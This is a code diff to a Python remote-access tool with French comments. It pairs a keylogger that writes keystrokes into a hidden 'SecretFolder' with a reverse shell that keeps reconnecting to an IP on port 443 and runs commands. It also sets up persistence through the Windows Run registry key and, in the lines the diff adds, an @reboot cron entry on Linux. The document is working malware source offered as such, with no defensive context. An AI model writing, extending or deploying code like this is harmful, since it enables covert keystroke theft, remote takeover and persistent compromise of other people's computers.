@@ -7,20 +7,23 @@ import os
 import sys
 import shutil
 import platform
-import winreg as reg
-from pynput import keyboard
-import pyautogui #la bib de screenshots
-import io
-import keyboard
-import requests
 import json
 import threading
 import cv2
+import io
+import keyboard
+import pyautogui
+import winreg as reg
 
 time_interval = 10
 text = ""
 
+# Configuration de l'environnement selon l'OS
+""" if platform.system() == "Windows": """
 hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
+""" else:
+    hidden_folder = os.path.join(os.path.expanduser('~/.config'), "SecretFolder", "keystrokes") """
+    
 os.makedirs(hidden_folder, exist_ok=True)  # Créer le répertoire caché s'il n'existe pas
 
 # Fichier de touches
@@ -28,8 +31,6 @@ keystroke_file_path = os.path.join(hidden_folder, "keystrokes.txt")
 
 # Variable pour suivre l'état de l'enregistrement
 is_recording = False
-
-
 
 #la fonction qui vas envoyer la resultat des commande executer 
 def sending(command):
@@ -61,7 +62,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(("192.168.1.34", 443))
+            s.connect(("192.168.100.9", 443))
             shell()
             break  # Exit loop after successful shell session
         except socket.error as e:
@@ -117,14 +118,20 @@ def add_persistence():
     script_path = os.path.abspath("your_script.py")  # Remplacer par le chemin de votre script
 
     try:
-        # Ouvrir la clé du registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
-        
-        # Ajouter l'entrée pour le script Python
-        reg.SetValueEx(registry_key, "MyEmptyKey", 0, reg.REG_SZ, "")
+        if platform.system() == "Windows":
+            # Ouvrir la clé du registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
+            
+            # Ajouter l'entrée pour le script Python
+            reg.SetValueEx(registry_key, "MyEmptyKey", 0, reg.REG_SZ, "")
 
-        # Fermer la clé du registre
-        reg.CloseKey(registry_key)
+            # Fermer la clé du registre
+            reg.CloseKey(registry_key)
+        else:
+            # Ajouter une tâche cron pour Linux
+            cron_job = f"@reboot {python_path} {script_path}\n"
+            with open(os.path.expanduser("~/.crontab"), "a") as cron_file:
+                cron_file.write(cron_job)
 
         return "Persistance configurée avec succès ! Le script s'exécutera au démarrage."
 
@@ -295,10 +302,6 @@ def shell():
             sending(f"Error: {str(e)}")
 
     print("Exiting shell...")
-
-
-
-
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
